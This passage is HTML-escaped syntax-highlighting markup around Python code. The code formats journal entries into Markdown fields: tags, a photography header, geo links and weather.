style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryUuid &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;uuid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;].&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;lower&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryIndex &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryDateTime &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryUuid&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryTags &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;tags&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; tag &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;tags&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\t\tentryTags &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryTags &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; #&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; tag&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;#Art&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryTags&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; and&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;#Photography&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryTags&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;):&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\tentryHeader &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;## &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryTime &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; | Photography&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\telse&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\tentryHeader &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;## &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryTime &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; | &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalName&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryLocation &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\tentryLocation &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;placeName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;](geo:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; str&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;round&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;latitude&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;],&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; str&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;round&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;longitude&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;],&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryWeather &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\tentryWeather &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; str&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;int&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;round&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;temperatureCelsius&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;],&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)))&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; °C&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;conditionsDescription&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\t\tentryWeather &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryWeather &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; • &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;weather&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;conditionsDescription&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span 